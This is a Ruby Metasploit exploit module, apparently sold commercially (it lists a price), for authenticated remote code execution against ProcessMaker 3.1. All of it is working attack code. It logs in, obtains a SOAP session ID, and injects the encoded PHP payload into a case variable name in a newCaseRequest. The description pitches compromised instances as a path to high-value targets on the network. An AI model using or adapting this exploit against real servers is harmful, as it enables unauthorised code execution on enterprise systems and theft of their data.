##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'ProcessMaker SOAP Remote Code Execution',
      'Description' => %q{
    This module exploits an authenticated remote code execution vulnerability
    in ProcessMaker.

    ProcessMaker is a popular enterprise software tool to enable businesses to
    manage defined processes for business tasks and workflows. Privileged
    access to a ProcessMaker instance may yield significant insight into internal
    processes, key stakeholders, and high value targets on the network. Tested against version 3.1.

    Categories: Open Source, Enterprise

    Price: 10

    Video: none

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base ProcessMaker directory path", '/']),
      ], self.class)
  end

  def exploit
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/login/login')
    })

    cookie = res.get_cookies

    data = Rex::MIME::Message.new
    data.add_part("[{'name':'USR_USERNAME','type':'text','label':'User','validate':'Any','required':'0'}]", nil, nil, 'form-data; name="__notValidateThisFields"')
    data.add_part("[{'name':'USR_USERNAME','type':'text','label':'User','validate':'Any','required':'0'}]", nil, nil, 'form-data; name="DynaformRequiredFields"')
    data.add_part('-18000', nil, nil, 'form-data; name="form[BROWSER_TIME_ZONE_OFFSET]"')
    data.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="form[USR_PASSWORD]"')
    data.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="form[USR_USERNAME]"')
    data.add_part('', nil, nil, 'form-data; name="form[USR_PASSWORD_MASK]"')
    data.add_part('en', nil, nil, 'form-data; name="form[USER_LANG]"')
    data.add_part('', nil, nil, 'form-data; name="form[URL]"')
    data.add_part('0', nil, nil, 'form-data; name="form[FAILED_LOGINS]"')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/login/authentication.php'),
      'data' => data.to_s,
      'ctype' => 'multipart/form-data; boundary=' + data.bound,
      'cookie' => cookie,
      'headers' => {
        'Referer' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/login/login')
      }
    })

    unless res && res.code == 200 && res.body =~ /Loading styles and images/
      fail_with(Failure::Unknown, "Authentication failed")
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/cases/casesStartPage_Ajax'),
      'vars_get' => {
        'action' => 'getProcessList'
      },
      'cookie' => cookie
    })

    json = JSON.parse(res.body)

    unless json[0]
      fail_with(Failure::Unknown, "No projects available with a task for this user")
    end

    project_id = json[0]["children"][0]["pro_uid"]
    task_id = json[0]["children"][0]["tas_uid"]

    soap_xml = %Q{
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:proc="http://www.processmaker.com">
   <soap:Header/>
   <soap:Body>
      <proc:login>
         <proc:userid>#{datastore['USERNAME']}</proc:userid>
         <proc:password>#{datastore['PASSWORD']}</proc:password>
      </proc:login>
   </soap:Body>
</soap:Envelope>
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/sysworkflow/en/classic/services/soap2'),
      'method' => 'POST',
      'ctype' => 'application/soap+xml;charset=UTF-8;action="http://www.processmaker.com/login"',
      'data' => soap_xml
    })

    session_id = $1 if res.body =~ /message>(.*?)</

    rce_xml = %Q{
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:proc="http://www.processmaker.com">
   <soap:Header/>
   <soap:Body>
      <proc:newCaseRequest>
         <proc:sessionId>#{session_id}</proc:sessionId>
         <proc:processId>#{project_id}</proc:processId>
         <proc:taskId>#{task_id}</proc:taskId>
         <!--1 or more repetitions:-->
         <proc:variables>
            <proc:name>rewq];#{payload.encoded}//</proc:name>
            <proc:value>rewq</proc:value>
         </proc:variables>
         <proc:variables>
            <proc:name>fdsa</proc:name>
            <proc:value>fdsa</proc:value>
         </proc:variables>
         <!--Zero or more repetitions:-->
      </proc:newCaseRequest>
   </soap:Body>
</soap:Envelope>
    }

		send_request_cgi({
		  'uri' => normalize_uri(target_uri.path, '/sysworkflow/en/classic/services/soap2'),
      'method' => 'POST',
      'ctype' => 'application/soap+xml;charset=UTF-8;action="http://www.processmaker.com/login"',
      'data' => rce_xml
    })

  end
end
